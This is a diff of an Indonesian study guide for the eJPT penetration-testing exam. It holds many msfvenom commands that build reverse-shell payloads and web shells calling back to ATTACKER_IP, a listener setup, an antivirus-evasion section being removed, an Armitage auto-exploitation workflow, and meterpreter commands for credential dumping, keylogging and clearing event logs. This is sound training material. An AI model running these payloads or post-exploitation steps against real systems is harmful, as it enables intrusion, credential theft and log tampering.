 msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f dll -o payload.dll
+  LHOST=ATTACKER_IP LPORT=4444 -f dll -o payload.dll
 
-# PowerShell
+# ASP / ASPX (web shell Windows IIS)
 msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f psh-cmd -o payload.ps1
+  LHOST=ATTACKER_IP LPORT=4444 -f asp -o shell.asp
 
-# ASP (web shell Windows IIS)
 msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f asp -o shell.asp
-
-# ASPX
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f aspx -o shell.aspx
+  LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
 
 # ─── LINUX ─────────────────────────────────────────────────
 
-# ELF binary
 msfvenom -p linux/x64/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f elf -o linux_payload
+  LHOST=ATTACKER_IP LPORT=4444 -f elf -o linux_payload
 
-# 32-bit
 msfvenom -p linux/x86/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f elf -o linux32_payload
+  LHOST=ATTACKER_IP LPORT=4444 -f elf -o linux32_payload
 
 # ─── WEB SHELLS ────────────────────────────────────────────
 
-# PHP web shell
+# PHP
 msfvenom -p php/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f raw -o shell.php
+  LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php
 
 # JSP (Java/Tomcat)
 msfvenom -p java/jsp_shell_reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f raw -o shell.jsp
+  LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp
 
 # WAR (Tomcat)
 msfvenom -p java/jsp_shell_reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f war -o shell.war
+  LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
 
 # ─── ANDROID ───────────────────────────────────────────────
 
 msfvenom -p android/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -o payload.apk
+  LHOST=ATTACKER_IP LPORT=4444 -o payload.apk
 
 # ─── MACOS ─────────────────────────────────────────────────
 
 msfvenom -p osx/x64/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -f macho -o payload.macho
-```
-
-### Encoding Payload (Bypass AV Dasar)
-
-```bash
-# Encode dengan shikata_ga_nai (paling populer)
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -e x86/shikata_ga_nai -i 10 \
-  -f exe -o encoded_payload.exe
-
-# Encode dengan template executable asli
-msfvenom -p windows/meterpreter/reverse_tcp \
-  LHOST=ATTACKER_IP LPORT=4444 \
-  -e x86/shikata_ga_nai -i 5 \
-  -x /usr/share/windows-resources/binaries/plink.exe \
-  -f exe -o injected_payload.exe
-
-# List encoder
-msfvenom -l encoders
-# x86/shikata_ga_nai    → excellent rank, paling sering dipakai
-# x64/xor_dynamic       → untuk 64-bit
+  LHOST=ATTACKER_IP LPORT=4444 -f macho -o payload.macho
 ```
 
 ### Multi/Handler Listener
 
-Selalu setup listener sebelum payload dieksekusi di target:
-
 ```bash
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp  # harus sama dengan payload
-set LHOST 0.0.0.0     # listen di semua interface
+set LHOST 0.0.0.0
 set LPORT 4444
-set ExitOnSession false  # jangan berhenti setelah dapat satu sesi
-run -j                   # jalankan sebagai background job
+set ExitOnSession false
+run -j
 ```
 
 ---
@@ -940,75 +1276,27 @@ run -j                   # jalankan sebagai background job
 
 ### Apa itu Armitage?
 
-Armitage adalah **GUI front-end** untuk Metasploit Framework. Memvisualisasikan target, menyederhanakan proses exploitation, dan memungkinkan kolaborasi tim (via Cobalt Strike — versi komersialnya).
+Armitage adalah **GUI front-end** untuk Metasploit Framework. Memvisualisasikan target dan menyederhanakan proses exploitation.
 
 ### Menjalankan Armitage
 
 ```bash
-# Pastikan PostgreSQL dan MSF berjalan
 service postgresql start
 msfdb init
-
-# Jalankan Armitage
 armitage
-```
-
-Saat pertama dibuka, Armitage akan minta koneksi ke MSF RPC server:
-- Host: 127.0.0.1
-- Port: 55553
-- Username: msf
-- Password: (kosong atau sesuai konfigurasi)
-
-### Interface Armitage
-
-```
-┌─────────────────────────────────────────────────────┐
-│  Menu Bar: Armitage | View | Hosts | Attacks | Help  │
-├──────────────┬──────────────────────────────────────┤
-│              │                                       │
-│   Module     │         Target Workspace              │
-│   Browser    │   (visualisasi host & koneksi)        │
-│   (kiri)     │                                       │
-│              ├──────────────────────────────────────┤
-│              │         Console/Tabs                  │
-│              │   (output, meterpreter sessions)      │
-└──────────────┴──────────────────────────────────────┘
 ```
 
 ### Workflow di Armitage
 
 ```
-1. HOST DISCOVERY
-   Hosts → Nmap Scan → Intense Scan
-   atau: Hosts → Add Hosts (manual)
-
-2. PORT & SERVICE SCAN
-   Klik kanan host → Scan
-   atau gunakan Nmap dari menu Hosts
-
-3. FIND ATTACKS
-   Attacks → Find Attacks
-   Armitage otomatis saran exploit berdasarkan service yang ditemukan
-
-4. EXPLOITATION
-   Klik kanan host → Attack → pilih exploit
-   Set options → Launch
-   Host berhasil dieksploitasi → icon berubah merah dengan petir
-
-5. INTERACT
-   Klik kanan host yang sudah owned → Meterpreter/Shell
-   → Interact: buka meterpreter console
-   → Access: browse files, upload/download
-   → Escalate Privilege: getsystem
-   → Pivot: setup routing ke jaringan internal
-
-6. HAIL MARY
-   Attacks → Hail Mary
-   Armitage otomatis mencoba SEMUA exploit yang kompatibel
-   (sangat agresif, gunakan hati-hati di lab)
+1. HOST DISCOVERY   → Hosts → Nmap Scan → Intense Scan
+2. FIND ATTACKS     → Attacks → Find Attacks (saran exploit otomatis)
+3. EXPLOITATION     → Klik kanan host → Attack → pilih exploit
+4. INTERACT         → Klik kanan host owned → Meterpreter → Interact
+5. HAIL MARY        → Attacks → Hail Mary (auto-exploit semua, gunakan hati-hati)
 ```
 
-### Fitur Penting Armitage
+### Fitur Penting
 
 | Fitur | Cara Akses | Fungsi |
 |---|---|---|
@@ -1018,14 +1306,6 @@ Saat pertama dibuka, Armitage akan minta koneksi ke MSF RPC server:
 | MSF Console | View → Console | Akses msfconsole langsung |
 | Sessions | View → Sessions | Manage semua sesi |
 | File Browser | Klik kanan → Access → Browse Files | GUI file manager |
-| Post Modules | Klik kanan → Post Modules | Jalankan post modules |
-
-### Catatan Armitage untuk eJPT
-
-- Armitage memudahkan visualisasi jaringan dan manajemen banyak sesi
-- Di ujian eJPT, pemahaman msfconsole tetap lebih penting
-- Armitage berguna untuk lab yang melibatkan banyak host
-- "Find Attacks" sangat membantu untuk menemukan exploit yang relevan secara otomatis
 
 ---
 
@@ -1042,6 +1322,7 @@ set <OPTION> <value>     → set nilai
 run / exploit            → jalankan
 sessions -l              → list sesi
 sessions -i <id>         → masuk ke sesi
+sessions -u <id>         → upgrade ke meterpreter
 background / Ctrl+Z      → background sesi
 ```
 
@@ -1051,23 +1332,24 @@ background / Ctrl+Z      → background sesi
 sysinfo / getuid         → info sistem & user
 getsystem                → escalate ke SYSTEM
 hashdump                 → dump password hash
+load kiwi → creds_all    → dump semua credentials (Mimikatz)
 shell                    → akses OS shell
 download / upload        → transfer file
 portfwd add              → port forwarding
 run autoroute            → setup pivot route
-load kiwi → creds_all    → dump semua credentials
 keyscan_start/dump       → keylogger
 screenshot               → ambil screenshot
+clearev                  → hapus event logs
 background               → background sesi
 ```
 
 ### Cheat Sheet Msfvenom
 
 ```bash
-# Windows reverse meterpreter
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe
+# Windows x64 reverse meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe
 
-# Linux reverse meterpreter
+# Linux x64 reverse meterpreter
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload
 
 # PHP web shell
@@ -1087,6 +1369,7 @@ run -j
 auxiliary/scanner/smb/smb_version
 exploit/windows/smb/ms17_010_eternalblue
 post/windows/gather/hashdump
+post/linux/gather/hashdump
 payload/windows/meterpreter/reverse_tcp
 ```
 
